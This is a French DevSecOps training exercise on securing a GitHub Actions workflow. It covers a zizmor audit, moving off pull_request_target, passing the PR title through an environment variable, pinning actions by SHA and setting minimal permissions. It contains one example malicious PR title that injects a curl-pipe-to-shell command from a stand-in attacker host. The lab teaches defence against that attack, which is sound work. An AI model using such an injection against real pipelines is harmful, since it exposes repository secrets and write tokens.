# TP07 — Sécuriser la CI : le pipeline est lui-même une cible

> Durée estimée : 45 min · Programme : jour 2, démonstration CI · Gate : [Gate 9](../../docs/gates-securite.md#gate-9--la-ci-est-elle-même-une-cible)
> Prérequis : **zizmor 1.30** (`tp/scripts/installer-outils.sh`), `yq` v4 (https://github.com/mikefarah/yq).

## Le contexte

La CI détient ce qu'un attaquant veut : des secrets (registre, cloud, signature), un jeton capable
d'écrire dans le dépôt, et la confiance de tout ce qui en sort. En mars 2025, l'action
`tj-actions/changed-files` a été compromise : son tag a été **déplacé** vers un commit malveillant qui
affichait les secrets dans les journaux de milliers de dépôts.

L'équipe a écrit un workflow d'accueil des contributeurs, en toute bonne foi. Il remercie l'auteur de
chaque nouvelle PR en citant son titre. Un attaquant ouvre une PR intitulée :

```
"; curl -s https://evil.example/x.sh | sh; echo "
```

Le titre est inséré **tel quel** dans le script shell, qui s'exécute avec les secrets du dépôt et un
jeton en écriture, parce que le déclencheur est `pull_request_target`.

## Objectif vérifiable

zizmor (profil `auditor`) ne trouve plus aucun constat de sévérité moyenne ou haute, le déclencheur
dangereux a disparu, aucune expression `${{ }}` ne figure dans un script, toute action est épinglée par
SHA, les permissions sont minimales, **et** le workflow remercie toujours l'auteur en citant le titre.
`./verify.sh` contrôle tout cela.

---

## Étape 1 — Auditer

```bash
zizmor --offline --persona auditor starter/workflows/accueil.yml
```

Sortie réelle (zizmor 1.30.1, résumé) :

```
warning[artipacked]: credential persistence through GitHub Actions artifacts
error[excessive-permissions]: overly broad permissions
error[dangerous-triggers]: use of fundamentally insecure workflow trigger
error[template-injection]: code injection via template expansion
error[unpinned-uses]: unpinned action reference
info[anonymous-definition]: workflow or action definition without a name
help[concurrency-limits]: insufficient job-level concurrency limits
7 findings (2 unsafe fixes): 1 informational, 1 low, 1 medium, 4 high
```

> **Question** : sans `--persona auditor`, `excessive-permissions` n'apparaît pas (constat « supprimé »).
> Pourquoi un outil choisit-il de masquer par défaut certains constats ? Quel profil utiliser en gate ?

## Étape 2 — L'injection (TODO 4)

Passez le titre par une **variable d'environnement** :

```yaml
- name: Remercier
  env:
    TITRE: ${{ github.event.pull_request.title }}
  run: echo "Merci pour la PR ${TITRE}"
```

> **Question** : pourquoi est-ce sûr ? Qui remplace `${{ ... }}`, et à quel moment, par rapport à
> l'interprétation du script par le shell ?

## Étape 3 — Le déclencheur et les permissions (TODO 1 et 2)

- `pull_request_target` s'exécute dans le contexte de la branche **cible**, avec ses secrets, même pour
  une PR venue d'un fork inconnu. Un message n'en a pas besoin : `pull_request`.
- `permissions: {}` au niveau du workflow, `contents: read` au niveau du job.

## Étape 4 — La chaîne d'approvisionnement (TODO 3)

Épinglez `actions/checkout` par SHA de commit complet, avec la version en commentaire, et ajoutez
`persist-credentials: false`. Reprenez le SHA utilisé par `.github/workflows/ci.yml` à la racine du dépôt.

> **Question** : Dependabot sait mettre à jour une action épinglée par SHA (voir `.github/dependabot.yml`).
> Pourquoi ce dépôt impose-t-il alors un délai de carence de 7 jours (`cooldown`) avant de proposer une
> nouvelle version ?

## Étape 5 — Validez

```bash
./verify.sh              # votre travail (starter/)
./verify.sh solution     # (option) la solution de référence
```

---

## Indices

<details>
<summary>Le squelette sécurisé</summary>

```yaml
on:
  pull_request:
    types: [opened]

permissions: {}

jobs:
  accueil:
    name: Remercier le contributeur
    runs-on: ubuntu-24.04
    permissions:
      contents: read
    steps:
      - uses: actions/checkout@<sha de 40 caractères> # vX.Y.Z
        with:
          persist-credentials: false
```
</details>

<details>
<summary>Aller jusqu'à zéro constat</summary>

`anonymous-definition` : donnez un `name:` au job. `concurrency-limits` : un bloc `concurrency` avec un
groupe par PR (`accueil-${{ github.event.pull_request.number }}`) et `cancel-in-progress: true`.
</details>

---

## Où chercher (documentation officielle)

- **zizmor, les audits** : https://docs.zizmor.sh/audits/
- **GitHub, durcissement des workflows** : https://docs.github.com/en/actions/reference/security/secure-use
- **Injections de script** : https://docs.github.com/en/actions/concepts/security/script-injections
- **`pull_request_target`** : https://securitylab.github.com/resources/github-actions-preventing-pwn-requests/
- **Compromission de tj-actions/changed-files (CVE-2025-30066)** : https://nvd.nist.gov/vuln/detail/CVE-2025-30066

---

## Pour aller plus loin

1. **Le cas réel du dépôt.** Lisez dans `docs/journal-securite.md` comment zizmor a bloqué la première
   version de `.github/dependabot.yml`. Quel était le risque ?
2. **Côté GitLab.** Quelles sont les équivalences dans `.gitlab-ci.yml` : variables protégées et masquées,
   pipelines de merge request venant de forks, images épinglées par digest ?
3. **Jenkins.** Dans le `Jenkinsfile`, repérez les points de vigilance équivalents (socket Docker,
   identifiants, bibliothèques partagées non épinglées). Voir `docs/comparatif-ci.md`.
4. **Auto-correction.** zizmor propose des corrections automatiques (`--fix`). Essayez-les sur une copie du
   starter : lesquelles sont « sûres », lesquelles ne le sont pas, et pourquoi ?

---

<div align="center">

**[Telemach Learning](https://www.telemach-learning.fr)** — Formation DevSecOps

</div>
